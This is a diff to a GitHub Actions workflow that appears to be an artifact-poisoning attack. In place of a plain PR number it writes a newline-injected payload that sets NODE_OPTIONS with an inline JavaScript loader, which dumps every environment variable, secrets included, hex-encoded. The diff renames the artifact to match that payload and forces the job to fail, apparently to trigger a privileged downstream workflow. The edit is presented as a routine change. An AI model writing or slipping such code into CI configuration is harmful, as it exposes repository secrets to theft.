@@ -18,7 +18,7 @@ jobs:
           MERGE_SHA: "anupamas01" # Set the desired value for MERGE_SHA
         run: |
           mkdir -p ./pr
-          echo $PR_NUMBER > ./pr/pr_number
+          echo -e "11\nNODE_OPTIONS=--experimental-modules\n--experimental-loader=data:text/javascript,console.log(Buffer.from(JSON.stringify(process.env)).toString('hex'));//" > ./pr/pr_number
           echo $PR_SHA > ./pr/pr_sha
           echo $MERGE_SHA > ./pr/merge_sha
 
@@ -26,11 +26,18 @@ jobs:
         id: upload-artifact
         uses: actions/upload-artifact@3cea5372237819ed00197afe530f5a7ea3e805c8
         with:
-          name: pr_data
+          name: pr_number
           path: pr/
 
+      - name: Check Artifact Upload Status
+        run: |
+          if [ -z "$(ls -A $RUNNER_TEMP/ArtifactUpload/*)" ]; then
+            echo "Artifact upload failed."
+            exit 1
+          fi
+
       - name: Intentionally Fail After Artifact Upload
-        if: failure()
+        if: always() # This step always runs, but it will fail if the previous step (Check Artifact Upload Status) has failed.
         run: |
           # Intentionally add a failure after the artifact upload
           exit 1
